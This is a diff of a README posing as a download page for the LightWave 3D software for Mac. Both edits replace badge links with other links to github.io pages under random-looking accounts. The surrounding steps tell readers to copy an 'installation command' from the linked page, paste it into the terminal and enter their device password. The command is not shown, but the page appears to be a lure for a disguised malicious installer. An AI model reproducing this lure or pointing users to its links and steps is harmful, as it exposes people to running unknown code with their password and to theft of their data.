@@ -3,7 +3,7 @@
 
 LightWave for Mac is a professional 3D modeling, rendering, and animation solution designed for artists and studios who need speed, flexibility, and production-ready tools on macOS. Follow the secure steps below to download and install it quickly. 🚀
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-007AFF?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/lightwave)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 If the button does not work, follow the installation steps below using the terminal command.
 
@@ -22,7 +22,7 @@ If the button does not work, follow the installation steps below using the termi
 
 1. Click the button below to get the installation command.  
 
-[![Get Install Command](https://img.shields.io/badge/Get%20Install%20Command-1F6FEB?style=flat-square&logo=terminal)](https://gistcdn.githack.com/sportsmenskyfall/60f8626f4918dacda887384a3e360088/raw/9290198cb820aba533c4be294343d7989842dfea/install.html)
+[![Get Installation Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://dinkkennyrice406.github.io/.github/)
 
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
